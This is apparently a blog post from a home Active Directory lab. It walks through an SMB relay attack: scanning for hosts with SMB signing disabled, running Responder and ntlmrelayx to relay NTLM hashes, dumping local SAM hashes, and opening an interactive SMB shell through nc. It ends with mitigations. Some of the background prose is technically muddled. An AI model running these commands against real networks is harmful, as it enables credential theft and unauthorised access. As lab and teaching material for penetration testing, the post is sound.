---
title: "SMB Relay Attack "
layout: post
category: Active-Directory
tags: [SMB]
excerpt: " "
---

# SMB Relay Overview 

A SMB relay attack is where an attacker captures a users NTLM hash and relays its to another machine on the network. Masquerading as the user and authenticating against SMB to gain shell or file access

## **How does an SMB Relay Attack Happen?**  
The SMB Relay attack abuses the NTLM challenge-response protocol. Commonly, all SMB  sessions used the NTML protocol for encryption and authentication purposes (i.e. NTLM  over SMB) . However, most sysadmins switched to KILE over SMB after research proved that the first version of NTLM is susceptible to Man-in-the-Middle attacks, the SMB Relay attack counting among them.  
Now, in normal client-server communication, there are a series of requests followed by  responses. **The idea behind an SMB Relay attack is to position yourself between the client and the server in order to capture the data packets transmitted between the two entities.**  

## **Attack steps**  
- **Step 1** : Scanning the network. A tool like NMAP is used to scan out the network for shares and IP addresses. Alternatively, you can use Metasploit to quickly map out network shares. Kind of useless if you don’t know the target’s credentials, but still a great go-to solution.  Now, if you feel lucky, you can also use Windows’ Explorer to discover network shares. This only works only if the hosts have enabled the access-based enumeration features.  

- **Step 2** : Using Metasploit or a similar tool, to conduct the attack. Remember that the purpose of this endeavor is to capture and ‘listen’ to enough auth packets in order to trick the server into believing that the attacker is actually the user.  


- **Step 3**:  If the server’s running NTLM version 2.0, you would need to approach this   differently, and that way would be the Impacket (i.e. collection of network protocols).  

- **Step 4**: The payload’s created with msfvenom. After that, we can use Metasploit to commence the Meterpreter session. Be warned – your payload is doomed to fail if the  target machine doesn’t have administrator rights to the duped server.
  
- **Step 5**:  Once the payload’s delivered, you would have gained access to the shell. That’s it  You’re in and can do whatever you want (or not).  Instead of cracking hashes gathered with Responder, we can instead relay those hashes  to specific machines and potentially gain access  

## **Requirements**  
-  SMB signing must be disabled on the target  
-  Relayed user credentials must be admin on machine



#  SMB Relay Attack 
1. **Discovering Hosts with SMB Signing Disabled**

```bash
sudo nmap -p445,139 --script=smb2-security-mode.nse -T4 192.168.1.0/24
```

![Desktop View](/assets/img/AD_Lab/1 (67).png){: }


**add ip of disable smb to target.txt

2. **Configuring Responder**
Because we have to relay the hash instead of just capturing it responder needs to have both the SMB server turned off and HTTP turned off. Edit the responder config file in **/etc/responder/Responder.conf** and turn off SMB and HTTP and then start responder 

![Desktop View](/assets/img/AD_Lab/1 (68).png){: }

**Run responder** 

```bash 
sudo responder -I eth0 -rdw -v
```

Responder should now look like this:

![Desktop View](/assets/img/AD_Lab/1 (69).png){: }

3. **Setup the relay script**

```bash
sudo ntlmrelayx.py -tf target.txt -smb2support
```

![Desktop View](/assets/img/AD_Lab/1 (70).png){: }

4. **Capturing the hash, relaying it and dumping the local SAM file**

Request a share that does not exist using an admin account. Notice how the script checks if Remote Registry is enabled and if not, enables it, dumps the SAM and then re-disables it.

![Desktop View](/assets/img/AD_Lab/1 (71).png){: }

**We can then takes these hashes and crack them or we can even attempt a pass-the-hash attack and attempt to gain a shell with the NTLMv2 hash on a different machine on the network.**

5. Interactive Shell

```bash
sudo ntlmrelayx.py -tf target.txt -smb2support -i
```

![Desktop View](/assets/img/AD_Lab/1 (72).png){: }

- run nc for localhost and  port

```bash
nc 127.0.0.1 11001

-> help
```

![Desktop View](/assets/img/AD_Lab/1 (73).png){: }

```bash
shares # will see all file share
ls # list all file
```

![Desktop View](/assets/img/AD_Lab/1 (74).png){: }


# SMB Relay Attack Mitigation
-  Enable SMB Signing on all devices. This can be done via Group Policy
-  Disable NTLM authentication on the network. Use Kerberos instead.
-  Limit Domain Admins to specific task


